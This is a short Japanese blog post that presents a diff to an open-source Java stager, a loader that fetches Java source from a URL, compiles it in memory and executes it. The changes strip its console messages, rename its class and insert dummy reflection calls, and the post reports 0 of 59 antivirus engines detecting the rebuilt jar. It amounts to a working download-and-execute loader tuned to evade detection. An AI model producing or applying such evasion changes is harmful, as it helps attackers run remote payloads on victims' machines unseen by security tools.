---
layout: post
title:  Java Stager
date:   2019-05-16 15:15:07 +0900
categories: [Binary]
---

https://cornerpirate.com/2018/08/06/java-stager-hide-from-av-in-memory/
https://github.com/cornerpirate/java-stager

```diff
diff --git a/pom.xml b/pom.xml
index f9d1eed..b4cf2a3 100644
--- a/pom.xml
+++ b/pom.xml
@@ -26,7 +26,7 @@ to work for runtimes that don't have a JDK installed.
         <gpg.executable>gpg2</gpg.executable>
        
         <!-- Setting up main class -->
-        <mainClass>Stager</mainClass>
+        <mainClass>St</mainClass>
     </properties>
 
     <licenses>
@@ -136,9 +136,13 @@ to work for runtimes that don't have a JDK installed.
             </plugin>
             <!-- this magic makes your jar executable from java -jar -->
             <plugin>
-                <artifactId>maven-jar-plugin</artifactId>
-                <version>3.1.0</version>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-assembly-plugin</artifactId>
+                <version>2.6</version>
                 <configuration>
+                    <descriptorRefs>
+                        <descriptorRef>jar-with-dependencies</descriptorRef>
+                    </descriptorRefs>
                     <archive>
                         <manifest>
                             <addClasspath>true</addClasspath>
@@ -147,6 +151,14 @@ to work for runtimes that don't have a JDK installed.
                         </manifest>
                     </archive>
                 </configuration>
+                <executions>
+                    <execution>
+                        <phase>package</phase>
+                        <goals>
+                            <goal>single</goal>
+                        </goals>
+                    </execution>
+                </executions>
             </plugin>
         </plugins>
     </build>
diff --git a/src/main/java/Stager.java b/src/main/java/Stager.java
index fd7eb94..5d48b06 100644
--- a/src/main/java/Stager.java
+++ b/src/main/java/Stager.java
@@ -60,45 +60,40 @@ public class Stager {
         
         // Check how many arguments were passed in
         if (args.length != 1) {
-            System.out.println("Proper Usage is: java -jar JavaStager-0.1-initial.jar <url>");
             System.exit(0);
         }
 
         // if we get here then a parameter was provided.
         String u = args[0];
-        System.out.println("[*] URL provided: " + u);
 
         try {
 
             // URL for java code
+            Method meth = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
             URL payloadServer = new URL(u);
 
             URLConnection yc = payloadServer.openConnection();
-            BufferedReader in = new BufferedReader(new InputStreamReader(
-                    yc.getInputStream()));
+            Method meth2 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
+            BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
 
             // Download code into memory
             String inputLine;
             StringBuffer payloadCode = new StringBuffer();
+            Method meth3 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
             while ((inputLine = in.readLine()) != null) {
                 payloadCode.append(inputLine + "\n");
             }
-            System.out.println("[*] Downloaded payload");
             
             // Compile it using Janino
-            System.out.println("[*] Compiling ....");
             SimpleCompiler compiler = new SimpleCompiler();
             compiler.cook(new StringReader(payloadCode.toString()));
             Class<?> compiled = compiler.getClassLoader().loadClass("Payload") ;
 
             // Execute "Run" method using reflection
-            System.out.println("[*] Executing ....");
             Method runMeth = compiled.getMethod("Run");
             // This form of invoke works when "Run" is static
             runMeth.invoke(null); 
             
-            System.out.println("[*] Payload, payloading ....");
-
             in.close();
         } catch (Exception ex) {
             ex.printStackTrace();
```

ビルド

```
mvn clean install
```

結果

0/59 (2019/5/16)

https://www.virustotal.com/ja/file/5da137e741513468bc9ea86ea57605e6f8b01395006ce139660a8aa6569044f6/analysis/1557986239/
